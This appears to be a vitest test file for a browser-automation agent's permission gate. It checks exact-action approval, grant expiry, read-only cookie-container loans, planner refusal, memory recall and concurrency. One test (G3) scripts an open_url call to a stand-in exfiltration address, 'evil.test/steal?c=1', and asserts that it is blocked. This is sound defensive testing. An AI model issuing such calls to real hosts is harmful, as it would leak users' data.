// Tests for docs/failure-modes.md G1-G10: the wiring of foxgate, foxloop,
// foxtrail, foxmemory and the brain. Only the tab and the tools are stubs.
import { createMemory, memoryStore } from "foxmemory";
import type { LoopTool } from "foxloop";
import { Log, MemoryStore, generateKey } from "foxtrail";
import { describe, expect, it } from "vitest";
import { createAgent, type AgentEvent, type RunInput } from "../src/agent.js";

const TABS: Record<number, { url: string; cookieStoreId: string }> = {
  1: { url: "http://shop.test/cart", cookieStoreId: "firefox-default" },
  2: { url: "http://bank.test/inbox", cookieStoreId: "firefox-container-9" },
};

const host = (tabId: () => number) => async () => new URL(TABS[tabId()]?.url ?? "").hostname;

async function setup(options: { recall?: () => Promise<never> } = {}) {
  const ran: { tool: string; args: Record<string, unknown>; domain?: string }[] = [];
  const grantsSeen: string[][] = [];
  let agentRef: ReturnType<typeof createAgent> | undefined;
  const makeTools = (tabId: () => number): LoopTool[] => [
    {
      name: "snapshot", description: "Read the page.", parameters: { type: "object", properties: {} }, scope: "read", domain: host(tabId),
      run: async () => {
        grantsSeen.push((await agentRef!.host.grants()).map((g) => g.scope));
        return { ok: true, summary: "Read the page.", untrusted: "A page." };
      },
    },
    {
      name: "fill", description: "Type text.", parameters: { type: "object", properties: { text: { type: "string" } }, required: ["text"] }, scope: "fill", domain: host(tabId),
      run: async (args, ctx) => { ran.push({ tool: "fill", args, domain: ctx.domain }); return { ok: true, summary: "Typed." }; },
    },
    {
      name: "click", description: "Click a button.", parameters: { type: "object", properties: { button: { type: "string" } }, required: ["button"] }, scope: "submit", domain: host(tabId),
      describe: (args) => `click the button "${String(args.button)}"`,
      run: async (args, ctx) => {
        ran.push({ tool: "click", args, domain: ctx.domain });
        const now = Date.now();
        if ((await agentRef!.host.grants()).some((g) => !g.expiresAt || g.expiresAt > now + 61_000)) throw new Error("a grant outlives the run budget");
        return { ok: true, summary: "Clicked.", check: { ok: true, checks: [{ part: "clicked", ok: true, evidence: String(args.button) }] } };
      },
    },
    {
      name: "open_url", description: "Open an address.", parameters: { type: "object", properties: { url: { type: "string" } }, required: ["url"] }, scope: "read",
      domain: (args) => new URL(String(args.url)).hostname,
      run: async (args) => { ran.push({ tool: "open_url", args }); return { ok: true, summary: "Opened." }; },
    },
  ];
  const trail = new Log({ store: new MemoryStore(), key: await generateKey() });
  const memory = createMemory({ store: memoryStore(), embedder: { embed: async (texts) => ({ model: "m", vectors: texts.map((t) => [t.includes("table") ? 1 : 0, 0.1]) }) } });
  await memory.remember("Party size: 4 people at every table.", { kind: "preference" });
  let problem: string | undefined;
  const agent = createAgent({
    browser: { tabs: { get: async (id: number) => ({ id, ...TABS[id] }) }, permissions: { contains: async () => false } },
    trail,
    memory: options.recall ? { recall: options.recall } : memory,
    makeTools,
    pageProblem: async () => problem,
    runMs: 60_000,
  });
  agentRef = agent;
  const events: AgentEvent[] = [];
  const run = (input: Partial<RunInput> & { script?: unknown[] }, answer: "approve" | "deny" = "approve") => agent.run({
    goal: "Buy the mug", tabId: 1, settings: { planner: "scripted", script: JSON.stringify(input.script ?? []) }, ...input,
    onEvent: (event) => {
      events.push(event);
      if (event.type === "approval-needed") void agent.approvals.answer(event.requestId, answer, "sidebar");
    },
  });
  return { agent, run, ran, events, trail, grantsSeen, setProblem: (p?: string) => { problem = p; } };
}

const finish = { tool: "finish", args: { summary: "Done." } };

describe("agent", () => {
  it("G1: the approval shows the exact action, and only that action runs", async () => {
    const { run, ran, events } = await setup();
    const end = await run({ script: [{ tool: "click", args: { button: "Buy" } }, finish] });
    expect(end.status).toBe("done");
    const asked = events.find((e) => e.type === "approval-needed");
    expect(asked && "exactText" in asked && JSON.parse(String(asked.exactText))).toEqual({ args: { button: "Buy" }, domain: "shop.test", scope: "submit", tool: "click" });
    expect(ran).toEqual([{ tool: "click", args: { button: "Buy" }, domain: "shop.test" }]);
  });

  it("G2: grants end with the run, and expire with its budget", async () => {
    const { run, agent } = await setup();
    await run({ script: [{ tool: "click", args: { button: "Buy" } }, finish] });
    expect(await agent.host.grants()).toEqual([]);
    await run({ script: [{ tool: "nope", args: {} }] });
    expect(await agent.host.grants()).toEqual([]);
  });

  it("G3: another host gets no grant", async () => {
    const { run, ran } = await setup();
    const end = await run({ script: [{ tool: "open_url", args: { url: "http://evil.test/steal?c=1" } }, finish] });
    expect(end).toMatchObject({ status: "blocked", reason: "gate-deny" });
    expect(ran).toEqual([]);
  });

  it("G4: a read loan gets read grants only", async () => {
    const { run, ran, grantsSeen } = await setup();
    const loan = { cookieStoreId: "firefox-container-9", scope: "read" as const };
    const end = await run({ tabId: 2, loan, script: [{ tool: "snapshot", args: {} }, { tool: "click", args: { button: "Send" } }, finish] });
    expect(grantsSeen[0]).toEqual(["read"]);
    expect(end).toMatchObject({ status: "blocked", reason: "gate-deny" });
    expect(ran).toEqual([]);
  });

  it("G5: a loan run in a tab outside the loan container is refused", async () => {
    const { run, ran, events } = await setup();
    const end = await run({ tabId: 1, loan: { cookieStoreId: "firefox-container-9", scope: "submit" }, script: [{ tool: "click", args: { button: "Buy" } }] });
    expect(end).toMatchObject({ status: "refused", reason: "loan-mismatch" });
    expect(ran).toEqual([]);
    expect(events.some((e) => e.type === "plan")).toBe(false);
  });

  it("G6: a brain refusal ends the run before any tool, and the trail has it", async () => {
    const { agent, ran, trail } = await setup();
    const end = await agent.run({ goal: "Buy the mug", tabId: 1, settings: { planner: "openai", consent: true } });
    expect(end).toMatchObject({ status: "refused", reason: "cloud-in-private" });
    expect(ran).toEqual([]);
    const kinds = (await trail.entries()).map((e) => e.kind);
    expect(kinds).toContain("run.refused");
    expect((await trail.verify()).ok).toBe(true);
  });

  it("G7: notes reach the planner's goal; a recall error does not stop the run", async () => {
    const { run, ran } = await setup();
    await run({ goal: "Book a table for Friday", script: [{ tool: "fill", args: { text: "{{goal}}" } }, { tool: "click", args: { button: "Book" } }, finish] });
    expect(String(ran[0]?.args.text)).toContain("- Party size: 4 people at every table.");
    const broken = await setup({ recall: async () => { throw new Error("model not loaded"); } });
    const end = await broken.run({ goal: "Book a table", script: [{ tool: "click", args: { button: "Book" } }, finish] });
    expect(end.status).toBe("done");
    expect(broken.events.find((e) => e.type === "recall")).toMatchObject({ notes: [], error: "model not loaded" });
  });

  it("G9: a second run at the same time is refused", async () => {
    const { agent, run } = await setup();
    const first = run({ script: [{ tool: "click", args: { button: "Buy" } }, finish] }, "approve");
    const second = await agent.run({ goal: "x", tabId: 1, settings: { planner: "scripted", script: "[]" } });
    expect(second).toMatchObject({ status: "refused", reason: "busy" });
    expect((await first).status).toBe("done");
  });

  it("G10: with no task check, the run passes only when the page shows no error", async () => {
    const ok = await setup();
    const end = await ok.run({ script: [{ tool: "fill", args: { text: "x" } }, finish] });
    expect(end.status).toBe("done");
    expect(ok.events.find((e) => e.type === "check")).toMatchObject({ ok: true, checks: [{ part: "the page shows no error (no task check)", ok: true }] });
    const bad = await setup();
    bad.setProblem("error page");
    const blocked = await bad.run({ script: [{ tool: "fill", args: { text: "x" } }, finish, finish] });
    expect(blocked).toMatchObject({ status: "blocked", reason: "check-failed" });
  });
});
